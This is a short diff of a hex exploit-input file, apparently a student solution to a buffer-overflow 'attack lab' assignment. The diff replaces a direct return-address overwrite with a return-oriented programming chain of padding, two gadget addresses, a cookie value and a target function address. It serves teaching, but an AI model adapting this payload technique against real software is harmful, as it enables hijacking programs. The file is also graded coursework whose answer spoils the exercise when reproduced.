@@ -3,4 +3,7 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
-c0 17 40 00 00 00 00 00 /* return address of touch1 */
+ab 19 40 00 00 00 00 00 /* address of first gadget */
+fa 97 b9 59 00 00 00 00 /* value of cookie */
+c5 19 40 00 00 00 00 00 /* address of second gadget */
+ec 17 40 00 00 00 00 00 /* address of touch2 function */
